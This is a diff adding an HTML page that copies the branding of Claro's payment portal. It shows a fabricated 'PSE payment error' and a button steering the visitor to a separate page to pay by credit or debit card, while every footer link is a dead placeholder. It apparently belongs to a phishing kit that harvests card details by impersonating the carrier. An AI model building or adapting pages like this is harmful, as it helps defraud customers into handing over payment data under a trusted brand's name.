@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="img/faviconc.ico" />
+    <title>Portal de pagos Claro</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Roboto", sans-serif;
+      }
+      header,
+      footer {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        padding: 10px;
+      }
+      header {
+        background-color: #da291c;
+        height: 8vh;
+        justify-content: center;
+      }
+      footer {
+        background-color: #333333;
+        color: #fff;
+        justify-content: space-between;
+        height: 13vh;
+        font-size: 14px;
+        font-weight: 700;
+      }
+      nav a {
+        color: #fff;
+        text-decoration: underline;
+        margin: 0 10px;
+        font-weight: 400;
+      }
+      section {
+        text-align: center;
+        padding: 20px;
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        height: 75vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        max-width: 500px;
+        margin: 2vh auto;
+      }
+      h1 {
+        color: #5c5c5c;
+        margin-bottom: 20px;
+        font-size: 28px;
+        font-weight: 700;
+      }
+      p {
+        margin: 15px 0;
+        font-size: 16px;
+        color: #5c5c5c;
+      }
+      button {
+        background-color: #da291c;
+        color: #fff;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 18px;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img src="img/logo-claro-blanco.svg" height="100%" />
+    </header>
+    <section>
+      <h1>Error en portal PSE</h1>
+      <img src="/img/lps.png" alt="Logo PSE" width="150px" />
+      <p>
+        Lo sentimos, no se pudo realizar el pago. Por favor, intenta otro método
+        de pago.
+      </p>
+      <a href="/tc.html">
+        <button>Pagar con tarjeta Crédito/Débito</button>
+      </a>
+    </section>
+    <footer>
+      <p style="color: #fff">Todos los derechos reservados, Claro 2024</p>
+      <nav>
+        <a href="/">Mapa de sitio</a>
+        <a href="/">Portal de denuncias</a>
+        <a href="/">Legal y regulatorio</a>
+      </nav>
+    </footer>
+    <script>
+      document.getElementById("back").addEventListener("click", () => {
+        window.location.href = "../../index2.html";
+      });
+    </script>
+  </body>
+</html>
